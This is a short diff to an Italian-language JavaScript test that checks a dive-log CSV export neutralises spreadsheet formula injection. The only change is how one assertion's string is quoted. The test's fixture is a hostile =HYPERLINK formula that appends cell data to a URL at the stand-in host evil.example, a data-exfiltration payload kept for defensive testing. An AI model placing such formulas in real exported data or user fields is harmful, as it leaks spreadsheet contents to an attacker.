@@ -112,7 +112,7 @@ describe('il CSV che l’applicazione esporta, l’applicazione lo rilegge', () 
     const ostile = { ...dive, site: { name: '=HYPERLINK("http://evil.example/?d="&A1,"Clicca")' } };
     const { csv } = esportaCsv([ostile], {});
     expect(csv).not.toMatch(/;"?=HYPERLINK/);
-    expect(csv).toContain("\"'=HYPERLINK");
+    expect(csv).toContain('"\'=HYPERLINK');
   });
 });
 
